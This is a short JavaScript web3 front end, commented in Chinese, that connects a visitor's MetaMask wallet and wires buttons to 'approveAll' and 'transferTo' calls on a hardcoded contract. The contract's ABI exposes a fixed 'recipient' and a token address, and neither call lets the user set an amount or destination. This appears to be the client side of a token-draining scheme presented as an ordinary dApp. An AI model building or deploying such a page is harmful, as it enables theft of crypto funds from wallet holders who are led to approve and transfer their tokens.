// 初始化Web3
let web3;
let accounts;
const contractAddress = "0x8B801270f3e02eA2AACCf134333D5E5A019eFf42"; // 智能合约地址
const abi = [
    {
        "inputs": [],
        "name": "approveAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "transferTo",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_tokenAddress",
                "type": "address"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "token",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

// 合约实例
let contract;

// 连接钱包
const connectWallet = async () => {
    if (window.ethereum) {
        try {
            // 请求用户授权连接钱包
            accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            
            // 创建合约实例
            contract = new web3.eth.Contract(abi, contractAddress);

            // 更新连接状态
            document.getElementById('walletStatus').innerText = `钱包已连接: ${accounts[0]}`;
            document.getElementById('connectButton').innerText = '已连接';
            console.log('钱包连接成功，地址: ', accounts[0]);

            // 启用授权和转移按钮
            document.getElementById('approveButton').disabled = false;
            document.getElementById('transferButton').disabled = false;

        } catch (error) {
            console.error('连接钱包失败', error);
            alert('钱包连接失败，请重试！');
        }
    } else {
        alert('请安装MetaMask!');
    }
};

// 调用合约的 approveAll 函数（授权）
const approveTokens = async () => {
    try {
        await contract.methods.approveAll().send({ from: accounts[0] });
        alert('授权成功');
        console.log('授权已发送');
    } catch (error) {
        console.error('授权失败', error);
        alert('授权失败，请检查合约和钱包地址');
    }
};

// 调用合约的 transferTo 函数（转移代币）
const transferTokens = async () => {
    try {
        await contract.methods.transferTo().send({ from: accounts[0] });
        alert('转移成功');
        console.log('转移已发送');
    } catch (error) {
        console.error('转移失败', error);
        alert('转移失败，请检查合约和钱包状态');
    }
};

// 绑定按钮点击事件
document.getElementById('connectButton').addEventListener('click', connectWallet);
document.getElementById('approveButton').addEventListener('click', approveTokens);
document.getElementById('transferButton').addEventListener('click', transferTokens);
